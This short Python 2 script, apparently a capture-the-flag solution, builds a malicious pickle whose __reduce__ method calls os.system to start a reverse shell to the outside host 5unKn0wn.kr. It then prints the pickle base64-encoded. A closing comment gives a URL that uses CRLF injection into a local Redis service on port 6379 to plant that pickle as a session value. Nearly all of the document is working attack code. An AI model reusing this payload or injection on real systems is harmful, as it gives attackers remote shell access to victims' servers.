from pickle import *
import os

class exploit(object):
	def __reduce__(self):
		p = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"5unKn0wn.kr\",6051));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
		return (os.system,(p,))

print dumps(exploit()).encode('base64').replace('\n', '')

# url=http://127.0.0.1%0d%0a%20set%20session:5unKn0wn1%20Y3Bvc2l4CnN5c3RlbQpwMAooUydweXRob24gLWMgXCdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiNXVuS24wd24ua3IiLDY1NjUpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pO1wnJwpwMQp0cDIKUnAzCi4=%0d%0a%20quit%0d%0a%20:6379/
